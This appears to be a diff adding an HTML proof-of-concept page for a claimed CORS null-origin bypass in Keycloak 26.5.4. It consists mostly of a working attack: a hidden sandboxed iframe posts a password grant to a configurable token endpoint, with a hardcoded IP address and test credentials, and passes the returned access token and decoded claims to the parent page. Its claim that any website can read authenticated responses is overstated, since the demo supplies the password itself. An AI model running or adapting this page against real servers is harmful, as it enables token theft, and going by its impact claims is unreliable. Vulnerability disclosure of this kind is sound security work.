@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<!--
+  PoC #2: CORS null-origin bypass via sandboxed iframe
+  Target:  Keycloak 26.5.4
+  Type:    CORS null origin (highest-risk variant)
+
+  The "null" origin is sent by:
+    - Sandboxed <iframe sandbox> elements
+    - data: URIs
+    - file:// pages
+    - Redirects from certain cross-origin pages
+
+  Keycloak responds to Origin: null with:
+    Access-Control-Allow-Origin: null
+    Access-Control-Allow-Credentials: true
+
+  This means ANY website can embed a sandboxed iframe that sends
+  "null" as the Origin and still read Keycloak's authenticated
+  responses cross-origin — completely bypassing Same-Origin Policy.
+
+  This is particularly dangerous because:
+    1. It bypasses any WAF rules checking for legitimate origins
+    2. The "null" origin cannot be safely allowlisted
+    3. No client webOrigins configuration can prevent this
+-->
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>PoC #2 — CORS null-origin bypass</title>
+  <style>
+    body { font-family: monospace; background: #1a1a1a; color: #00ff41; padding: 20px; }
+    h2  { color: #ff4444; }
+    h3  { color: #ffaa00; }
+    pre { background: #111; padding: 15px; border: 1px solid #444; overflow-x: auto; white-space: pre-wrap; }
+    .err { color: #ff4444; }
+    button { background: #ff4444; color: white; border: none; padding: 10px 20px; cursor: pointer; }
+    input  { background: #333; color: #eee; border: 1px solid #555; padding: 5px; width: 320px; }
+    label  { display: inline-block; width: 130px; }
+  </style>
+</head>
+<body>
+  <h2>&#x1F4A5; PoC #2 — CORS null-origin Bypass (sandboxed iframe)</h2>
+  <p>Keycloak 26.5.4 responds to <code>Origin: null</code> with <code>ACAO: null + credentials: true</code></p>
+
+  <h3>Configuration</h3>
+  <label>KC URL:</label>
+  <input id="kcUrl" value="http://46.101.162.187:8080"><br>
+  <label>Realm:</label>
+  <input id="realm" value="test"><br>
+  <label>Client ID:</label>
+  <input id="clientId" value="webapp"><br>
+  <label>Username:</label>
+  <input id="username" value="testuser"><br>
+  <label>Password:</label>
+  <input id="password" type="password" value="Password123"><br>
+  <br>
+  <button onclick="launchNullOriginAttack()">Launch null-origin Attack</button>
+
+  <h3>Attack Output</h3>
+  <pre id="output">Waiting...</pre>
+
+  <!-- Hidden sandboxed iframe that does the actual attack -->
+  <!-- The iframe gets Origin: null from the browser -->
+  <iframe id="attackFrame" sandbox="allow-scripts" style="display:none"></iframe>
+
+<script>
+function launchNullOriginAttack() {
+  const kcUrl    = document.getElementById('kcUrl').value.trim();
+  const realm    = document.getElementById('realm').value.trim();
+  const clientId = document.getElementById('clientId').value.trim();
+  const username = document.getElementById('username').value.trim();
+  const password = document.getElementById('password').value;
+
+  const tokenUrl = `${kcUrl}/realms/${realm}/protocol/openid-connect/token`;
+  const output   = document.getElementById('output');
+  output.textContent = 'Injecting attack into sandboxed iframe (Origin will be "null")...';
+
+  // Listen for result from sandboxed iframe
+  window.addEventListener('message', function handler(e) {
+    output.innerHTML = e.data;
+    window.removeEventListener('message', handler);
+  });
+
+  // Build the attack script that runs inside the sandboxed iframe
+  // The iframe will have Origin: null (because sandbox with no allow-same-origin)
+  const attackScript = `
+    const tokenUrl = ${JSON.stringify(tokenUrl)};
+    const body = 'grant_type=password&client_id=${clientId}&username=${username}&password=${password}&scope=openid';
+    fetch(tokenUrl, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+      body: body,
+      credentials: 'include'
+    }).then(r => {
+      const acao = r.headers.get('Access-Control-Allow-Origin');
+      const acac = r.headers.get('Access-Control-Allow-Credentials');
+      return r.json().then(data => {
+        if (data.access_token) {
+          const payload = JSON.parse(atob(data.access_token.split('.')[1].replace(/-/g,'+').replace(/_/g,'/')));
+          parent.postMessage(
+            '<span style="color:#ff4444">✗ NULL-ORIGIN ATTACK SUCCEEDED\\n' +
+            'Access-Control-Allow-Origin: ' + acao + '\\n' +
+            'Access-Control-Allow-Credentials: ' + acac + '\\n\\n' +
+            'access_token: ' + data.access_token.substring(0,80) + '...\\n\\n' +
+            'Claims: ' + JSON.stringify(payload, null, 2) + '</span>',
+            '*'
+          );
+        } else {
+          parent.postMessage('Response: ' + JSON.stringify(data), '*');
+        }
+      });
+    }).catch(e => parent.postMessage('Error: ' + e.message, '*'));
+  `;
+
+  // Inject script into sandboxed iframe via srcdoc
+  const frame = document.getElementById('attackFrame');
+  frame.srcdoc = `<script>${attackScript}<\/script>`;
+}
+</script>
+</body>
+</html>
